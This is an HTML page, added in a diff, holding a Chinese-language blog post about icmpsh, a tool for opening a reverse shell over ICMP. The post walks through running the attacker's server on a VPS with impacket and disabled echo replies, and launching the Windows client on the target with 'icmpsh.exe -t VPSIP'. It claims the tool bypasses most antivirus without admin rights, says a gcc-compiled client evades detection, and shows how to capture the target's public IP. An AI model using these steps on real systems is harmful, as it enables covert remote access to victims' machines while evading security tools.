@@ -1,0 +1,219 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>ICMP隧道工具---icmpsh | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/1313/1.jpg')">
+            </div>
+          
+          <h2 class="post-title">ICMP隧道工具---icmpsh</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2020-05-09</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/icmp/">
+                    icmp
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/icmpsh/">
+                    icmpsh
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/shell/">
+                    shell
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>  最近了解到一个通过ICMP协议反弹shell 的工具，运行不需要管理员权限也可以绕过大部分杀软，比较好用这里记录一下备忘。</p>
+<!-- more -->
+<h3 id="0x01-软件介绍">0x01 软件介绍</h3>
+<p>点击<a href="https://github.com/inquisb/icmpsh">这里</a>直接下载,下载后可以看到有如下文件。<br>
+<img src="https://tuchuang.looklook.workers.dev/1313/icmpsh.png" alt="icmpsh" loading="lazy"></p>
+<p>和NC类似，该软件也分为客户端和服务端，这里详细解释一下各个文件的作用<br>
+<strong>客户端：运行在目标终端(只有Windows版本)</strong><br>
+<strong>服务端：运行在用于回弹Shell的服务器，一般是自己的VPS服务器</strong></p>
+<blockquote>
+<p>icmpsh.exe              Windows客户端<br>
+icmpsh_m.py          Python版本的服务端<br>
+icmpsh-m.c            C语言版的的服务端（需要进行编译）<br>
+icmpsh-m.pl           Perl版本的服务端<br>
+icmpsh-s.c              C语言版本的客户端（需要进行编译）<br>
+run.sh                       服务端主程序</p>
+</blockquote>
+<h3 id="0x02-服务端">0x02 服务端</h3>
+<p>运行前首先执行如下两条命令，第一条安装协议，第二条便于在VPS查看回显</p>
+<pre><code>apt-get install python-impacket
+sysctl -w net.ipv4.icmp_echo_ignore_all=1
+</code></pre>
+<h4 id="1运行runsh">1.运行run.sh</h4>
+<p>直接运行后会提示输入目标主机的公网IP，接着在目标端直接执行给出的命令就可以回弹<br>
+<img src="https://tuchuang.looklook.workers.dev/1313/server-1.png" alt="server" loading="lazy"></p>
+<h4 id="2运行python版">2.运行Python版</h4>
+<p>运行Python版需要提供两个IP参数</p>
+<pre><code>python icmpsh_m.py + VPSIP + 目标公网IP 
+</code></pre>
+<h4 id="3运行c语言版本">3.运行C语言版本</h4>
+<p>这个和Python语法一样，不过首先要先进行编译</p>
+<pre><code>gcc imcpsh-m.c -o icmpsh
+./icmpsh + VPSIP + 目标公网IP
+</code></pre>
+<h3 id="0x03-客户端">0x03 客户端</h3>
+<p>客户端命令很简单，<strong>这里强调一下，用gcc编译的客户端可以绕过杀软但是默认的不行</strong></p>
+<pre><code>icmpsh.exe -t + VPSIP
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/1313/gcc.png" alt="gcc" loading="lazy"></figure>
+<h3 id="0x04-利用vps获取目标公网地址">0x04 利用VPS获取目标公网地址</h3>
+<p>你可能会想怎么获取目标的出口IP地址？首先在VPS端监听，然后目标机上ping一下VPS机器，就可以在VPS上看到目标的出口IP地址<br>
+<strong>VPS端：</strong></p>
+<pre><code>tcpdump -i eth0 icmp
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://tuchuang.looklook.workers.dev/1313/GETIP.png" alt="Get-ip" loading="lazy"></figure>
+<blockquote>
+<p>作者： Mari0er<br>
+链接： https://mari0er.top/post/icmpsh.html<br>
+版权： 本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！！</p>
+</blockquote>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/hack-for-domain.html/">
+              <h3 class="post-title">
+                下一篇：初识域渗透---持续更新
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
